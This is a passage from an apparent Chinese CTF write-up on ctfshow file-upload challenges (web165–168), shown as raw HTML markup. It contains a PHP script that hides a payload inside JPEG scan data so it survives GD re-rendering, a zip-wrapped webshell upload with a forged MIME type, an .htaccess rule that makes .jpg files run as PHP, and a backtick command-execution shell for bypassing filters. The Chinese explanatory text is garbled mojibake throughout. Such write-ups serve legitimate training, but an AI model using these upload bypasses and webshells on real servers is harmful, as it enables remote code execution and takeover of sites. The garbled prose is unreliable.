punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0xFFD8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Incorrect SOI marker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$marker</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>            <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">skip</span><span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$marker</span> <span class="token operator">===</span> <span class="token number">0xDA</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$startPos</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$outStreamTmp</span> <span class="token operator">=</span>                     <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span> <span class="token operator">.</span>                     <span class="token variable">$miniPayload</span> <span class="token operator">.</span>                     <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\0"</span><span class="token punctuation">,</span><span class="token variable">$nullbytePayloadSize</span><span class="token punctuation">)</span> <span class="token operator">.</span>                     <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">checkImage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'_'</span><span class="token operator">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$outStreamTmp</span><span class="token punctuation">,</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$extraBytes</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token property">readByte</span> <span class="token operator">!==</span> <span class="token number">0x00</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                <span class="token keyword">break</span><span class="token punctuation">;</span>                            <span class="token punctuation">&#125;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token variable">$stopPos</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>                    <span class="token variable">$imageStreamSize</span> <span class="token operator">=</span> <span class="token variable">$stopPos</span> <span class="token operator">-</span> <span class="token variable">$startPos</span><span class="token punctuation">;</span>                    <span class="token variable">$outStream</span> <span class="token operator">=</span>                         <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span> <span class="token operator">.</span>                         <span class="token variable">$miniPayload</span> <span class="token operator">.</span>                         <span class="token function">substr</span><span class="token punctuation">(</span>                            <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\0"</span><span class="token punctuation">,</span><span class="token variable">$nullbytePayloadSize</span><span class="token punctuation">)</span><span class="token operator">.</span>                                <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">,</span> <span class="token variable">$imageStreamSize</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                            <span class="token number">0</span><span class="token punctuation">,</span>                            <span class="token variable">$nullbytePayloadSize</span><span class="token operator">+</span><span class="token variable">$imageStreamSize</span><span class="token operator">-</span><span class="token variable">$extraBytes</span><span class="token punctuation">)</span> <span class="token operator">.</span>                                 <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$stopPos</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$correctImage</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token variable">$outStream</span> <span class="token operator">=</span> <span class="token variable">$outStreamTmp</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">checkImage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'payload_'</span><span class="token operator">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$outStream</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Success!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'payload_'</span><span class="token operator">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Something\'s wrong'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">checkImage</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$unlink</span> <span class="token operator">=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">;</span>        <span class="token function">imagecreatefromjpeg</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$unlink</span><span class="token punctuation">)</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">custom_error_handler</span><span class="token punctuation">(</span><span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token variable">$errfile</span><span class="token punctuation">,</span> <span class="token variable">$errline</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$extraBytes</span><span class="token punctuation">,</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(\d+) extraneous bytes before marker/'</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$extraBytes</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token variable">$m</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">DataInputStream</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$binData</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$order</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$size</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$order</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token variable">$fromString</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">order</span> <span class="token operator">=</span> <span class="token variable">$order</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$fromString</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'File not exists ['</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token operator">.</span><span class="token string single-quoted-string">']'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">size</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">size</span> <span class="token operator">-</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">skip</span><span class="token punctuation">(</span><span class="token variable">$skip</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token variable">$skip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'End Of File'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$byte</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$byte</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'End Of File'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">order</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> <span class="token variable">$short</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token class-name">binData</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>Êâæ‰∫ÜÂ•Ω‰πÖÊâçÊâæÂà∞ÂèØ‰ª•ÈÄöËøáÁöÑÈ©¨</p><p><strong>Ê∏≤ÊüìÂâç</strong></p><p><img src="3_first.jpg" loading="lazy"><em>Ê∏≤ÊüìÂâç</em></p><p><strong>Ê∏≤ÊüìÂêé</strong></p><p><img src="3_second.jpg" loading="lazy"><em>Ê∏≤ÊüìÂêé</em></p><p><img src="web165.png" alt="image-20240702212536949" loading="lazy"></p><h4 id="web166-zipËøΩÂä†È©¨"><a href="#web166-zipËøΩÂä†È©¨" class="headerlink" title="web166(zipËøΩÂä†È©¨)"></a>web166(zipËøΩÂä†È©¨)</h4><p>Âè™ÂÖÅËÆ∏‰∏ä‰º†zipÊñá‰ª∂ÔºåÈöè‰æø‰∏ä‰º†‰∏Ä‰∏™ÔºåÁÑ∂ÂêéÂÜÖÂÆπÊîπ‰∏∫‰∏ÄÂè•ËØùÊú®È©¨Âç≥ÂèØÔºåÊàëÂú®‰∏ä‰º†Êó∂ÔºåËøòÊúâMIMEÊ£ÄÊµãÊâÄ‰ª•‰πüÈúÄË¶ÅÊîπ</p><p><code>Content-Type=appliaction/x-zip-compressed</code></p><p><img src="web166.png" loading="lazy"></p><p>ÊúÄÂêéÁÇπÂáª‰∏ãËΩΩÊñá‰ª∂ÔºåÊäìÂåÖÂêéÂèëËµ∑POSTËØ∑Ê±ÇÂæóÂà∞flag</p><p><img src="web166_2.png" loading="lazy"></p><h4 id="web167-htaccess"><a href="#web167-htaccess" class="headerlink" title="web167(.htaccess)"></a>web167(.htaccess)</h4><p>ÈÇ£Â∫îËØ•ÂíåapacheÊúâÂÖ≥Ôºå‰∏ªË¶ÅÂà©Áî®.htaccessËøõË°åÁªïËøá‰∫Ü</p><p><strong>.htaccessÊñá‰ª∂</strong></p><blockquote><p>htaccess Âú®Á´ôÁÇπÁöÑÊ†πÁõÆÂΩï‰∏ãÈù¢Ôºå‰∏çÊòØÂú®apacheÁõÆÂΩï‰∏ãÔºå‰ΩÜÊòØÂÆÉÂ±û‰∫éapacheÁöÑ‰∏Ä‰∏™ÈÖçÁΩÆÊñá‰ª∂</p></blockquote><blockquote><p>htaccessÊñá‰ª∂Êó∂ApacheÊúçÂä°‰∏≠ÁöÑ‰∏Ä‰∏™ÈÖçÁΩÆÊñá‰ª∂ÔºåÂÆÉË¥üË¥£Áõ∏ÂÖ≥ÁõÆÂΩï‰∏ãÁöÑÁΩëÈ°µÈÖçÁΩÆ„ÄÇÈÄöËøáhtaccessÊñá‰ª∂ÔºåÂèØ‰ª•Â∏ÆÂä©Êàë‰ª¨ÂÆûÁé∞ÔºöÁΩëÈ°µ301</p><p>ÈáçÂÆöÂêë„ÄÅËá™ÂÆö‰πâ404ÈîôËØØÈ°µÈù¢ÔºåÊîπÂèòÊñá‰ª∂Êâ©Â±ïÂêç„ÄÅÂÖÅËÆ∏&#x2F;ÈòªÊ≠¢ÁâπÂÆöÁöÑÁî®Êà∑ÊàñËÄÖÁõÆÂΩïÁöÑËÆøÈóÆÔºåÁ¶ÅÊ≠¢ÁõÆÂΩïÂàóË°®ÔºåÈÖçÁΩÆÈªòËÆ§ÊñáÊ°£Á≠âÂäüËÉΩ</p></blockquote><blockquote><p>ÂÖ∂‰∏≠.htaccessÊñá‰ª∂ÂÜÖÂÆπÔºöSetHandler application&#x2F;x-http-phpÁöÑÊÑèÊÄùÊòØËÆæÁΩÆÂΩìÂâçÁõÆÂΩïÊâÄÊúâÊñá‰ª∂ÈÉΩ‰ΩøÁî®phpËß£ÊûêÔºåÈÇ£‰πàÊó†ËÆ∫‰∏ä‰º†‰ªª‰ΩïÊñá</p><p>‰ª∂ÔºåÂè™Ë¶ÅÁ¨¶ÂêàphpËØ≠Ë®Ä‰ª£Á†ÅËßÑËåÉÔºåÂ∞±‰ºöË¢´ÂΩìÂÅöPHPÊâßË°å„ÄÇ‰∏çÁ¨¶ÂêàËßÑÂàôÂàôÊä•Èîô</p></blockquote><p>È¶ñÂÖà‰∏ä‰º†.htaccess</p><p><code>AddType application/x-httpd-php .jpg</code> &#x2F;&#x2F;Â∞Ü.jpgÂêéÁºÄÁöÑÊñá‰ª∂Ëß£ÊûêÊàêphp</p><p>ÁÑ∂ÂêéÂÜç‰∏ä‰º†1.jpgÔºåÈáåÈù¢Âä†‰∏äÈ©¨ÁöÑÂÜÖÂÆπÔºå‰πãÂêéÁõ¥Êé•ËÆøÈóÆxxx&#x2F;upload&#x2F;1.jpgÂç≥ÂèØ</p><h4 id="web168-ÂêéÈó®ÂÖçÊùÄ"><a href="#web168-ÂêéÈó®ÂÖçÊùÄ" class="headerlink" title="web168(ÂêéÈó®ÂÖçÊùÄ)"></a>web168(ÂêéÈó®ÂÖçÊùÄ)</h4><p><strong>Âü∫Á°ÄÂÖçÊùÄ</strong></p><p>ÊµãËØïÔºå‰ºöÊ£ÄÊµã<code>_GET</code>„ÄÅ<code>_POST</code>„ÄÇ</p><p>ÂèØÊäìÂåÖÂêé‰øÆÊîπÁõ¥Êé•‰∏ä‰º†phpÊñá‰ª∂„ÄÇ</p><p><strong>ÂèçÂºïÂè∑</strong></p><p>ÂèçÂºïÂè∑ËææÂà∞ÂëΩ‰ª§ÊâßË°åÁöÑÊïàÊûú„ÄÇ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token string backtick-quoted-string">`whoami`</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$_</span><span class="token punctuation">;</span><span class="token comment">// &lt;?= `whoami`</span><span class="token delimiter important">?></span></span></code></pre><p>ÊääÊ∫êÁ†ÅÊãî‰∏ãÊù•</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-24 19:34:52# @Last Modified by:   h1xa# @Last Modified time: 2020-10-30 00:11:17# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=></span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=></span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$filesize</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$filesize</span><span class="token operator">></span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=></span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=></span><span class="token string double-quoted-string">"Êñá‰ª∂Ë∂ÖËøá1024KB"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'./upload/'</span><span class="token operator">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=></span><span class="token 